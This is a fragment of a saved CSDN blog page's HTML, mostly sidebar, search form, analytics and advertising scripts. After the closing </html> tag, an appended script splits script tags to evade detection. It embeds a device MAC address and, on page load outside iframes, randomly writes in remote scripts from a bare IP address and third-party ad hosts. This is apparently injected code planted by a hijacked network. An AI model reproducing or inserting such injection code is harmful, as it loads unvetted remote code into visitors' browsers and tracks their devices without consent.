+    <li>
+   
+         <a href="/guolin_blog/article/details/40083685#comments">历久而新，我的新书《第二行代码》已出版！</a>
+    <p style="margin:0px;"><a href="/hanlin740473789" class="user_name">hanlin740473789</a>:
+郭老师，你好在学习百度的LBS是发现，不行，是代码出了问题吗
+    </p>
+    </li>
+</ul>
+</div>
+<div class="panel" id="panel_Search">
+    <ul class="panel_head"><span>文章搜索</span></ul>
+    <ul class="panel_body">
+        <form id="frmSearch" action="http://so.csdn.net/search" class="form_search" target="_blank">
+        <span><input id="inputSearch" type="text" class="blogsearch" title="请输入关键字" /></span>
+        <input id="btnSubmit" type="button" value="搜索" title="search in blog" />
+        <input type="hidden" name="q" id="inputQ" />
+        <input type="hidden" name="t" value="blog" />
+        <a id="btnSearchBlog" target="_blank"></a>
+        </form>
+    </ul>
+</div>
+
+<script type="text/javascript">
+    $(function () {
+        $("#btnSubmit").click(function () {           
+            search();
+        });
+
+        $("#frmSearch").submit(function () {
+            search();
+            return false;
+        });
+
+        function search()
+        {
+            var url = "http://so.csdn.net/so/search/s.do?q=" + encodeURIComponent($("#inputSearch").val()) + "&u=" + username + "&t=blog";
+            window.location.href = url;
+        }   
+    });
+</script>
+
+<div id="custom_column_37394313" class="panel">
+<ul class="panel_head"><span>统计</span></ul>
+<ul class="panel_body">
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1601636'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/stat.php%3Fid%3D1601636' type='text/javascript'%3E%3C/script%3E"));</script>
+</ul>
+</div>    </div>
+    <div class="clear">
+    </div>
+
+
+                 <!-- 广告位开始 --> 
+                    <ins data-revive-zoneid="189" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins> 
+                <!-- 广告位结束 -->
+
+           </div>   
+
+            <div class="clear">
+            </div>
+        </div>
+
+        
+
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/cnick/cnick.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/newblog.min.js"></script>
+
+
+<script type="text/javascript" src="http://medal.blog.csdn.net/showblogmedal.ashx?blogid=844287"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/JavaScript1.js"></script>
+
+    <script type="text/javascript" src="http://passport.csdn.net/content/loginbox/login.js"></script>
+<script type="text/javascript">document.write("<img src=http://counter.csdn.net/pv.aspx?id=24 border=0 width=0 height=0>");</script>
+<script type="text/javascript" src="http://www.csdn.net/ui/scripts/Csdn/counter.js"></script>
+<script type="text/javascript" src="http://ad.csdn.net/scripts/ad-blog.js"></script>
+<script type="text/javascript">
+    $(function () {
+        function __get_code_toolbar(snippet_id) {
+            return $("<span class='tracking-ad' data-mod='popu_167'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "' target='_blank' title='在CODE上查看代码片'  style='text-indent:0;'><img src='https://code.csdn.net/assets/CODE_ico.png' width=12 height=12 alt='在CODE上查看代码片' style='position:relative;top:1px;left:2px;'/></a></span>"
+                    + "<span class='tracking-ad' data-mod='popu_170'><a href='https://code.csdn.net/snippets/"
+                    + snippet_id
+                    + "/fork' target='_blank' title='派生到我的代码片' style='text-indent:0;'><img src='https://code.csdn.net/assets/ico_fork.svg' width=12 height=12 alt='派生到我的代码片' style='position:relative;top:2px;left:2px;'/></a></span>");
+        }
+        
+        $("[code_snippet_id]").each(function () {
+            __s_id = $(this).attr("code_snippet_id");
+            if (__s_id != null && __s_id != "" && __s_id != 0 && parseInt(__s_id) > 70020) {
+                __code_tool = __get_code_toolbar(__s_id);
+                $(this).prev().find(".tools").append(__code_tool);
+            }
+        });
+
+        $(".bar").show();
+    });
+</script>
+
+
+
+
+
+    </div>
+      <!--new top-->
+    
+    <script id="csdn-toolbar-id" btnId="header_notice_num" wrapId="note1" count="5" subCount="5" type="text/javascript" src="http://c.csdnimg.cn/public/common/toolbar/js/toolbar.js"></script>     <!--new top-->
+   
+    <link href="http://c.csdnimg.cn/comm_ask/css/ask_float_block.css" type="text/css" rel="stylesheet" />
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/wmd.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/showdown.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/libs/prettify.js'></script>
+    <script language='JavaScript' type='text/javascript' src='http://c.csdnimg.cn/comm_ask/js/apps/ask_float_block.js'></script>
+   
+
+   
+
+  <div id="a52b5334d" style="width: 1px; height: 1px; display: none;">
+                    <script id="adJs52b5334"></script>
+                    <script>document.getElementById("adJs52b5334").src = "http://ads.csdn.net/js/opt/52b5334.js?t=" + Math.random();</script>
+   </div>
+
+    <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_code.css" />
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/saveToCode.js"></script>
+      <script type="text/javascript" src="//csdnimg.cn/rabbit/tracking-ad/main.js?75eacd8"></script>
+
+     <link rel="stylesheet" href="http://static.blog.csdn.net/css/fa.css" />
+
+    <div class="pop_CA_cover"  style="display:none"></div>
+    <div class="pop pop_CA"  style="display:none">
+          <div class="CA_header">
+            收藏助手
+            <span class="cancel_icon"  id="fapancle"  onclick="$('.pop_CA').hide();$('.pop_CA_cover').hide();"></span>
+          </div>
+          <iframe src="" id="fa" frameborder="0" width="100%" height="360"  scrolling="no" />
+    </div>
+</body>
+</html>   
+ <script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=5&&x<20:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B\"></scr"+"ipt>");
+break;
+case x>=50&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10269&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
